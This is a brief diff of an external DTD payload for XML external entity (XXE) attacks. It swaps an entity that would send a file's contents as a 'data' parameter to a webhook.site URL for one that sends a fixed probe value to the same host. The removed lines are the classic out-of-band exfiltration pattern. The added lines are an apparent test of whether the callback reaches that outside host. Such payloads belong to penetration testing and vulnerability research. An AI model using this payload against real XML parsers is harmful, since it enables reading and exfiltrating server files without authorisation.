@@ -1,4 +1,3 @@
-<!ENTITY % file 'really'>
-<!ENTITY % eval "<!ENTITY #&25; exfil SYSTEM 'https://webhook.site/a651ce15-7950-4f46-9770-46adfa624465/?data=%file;'>">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://webhook.site/a651ce15-7950-4f46-9770-46adfa624465/?probe=3'>">
 %eval;
 %exfil;
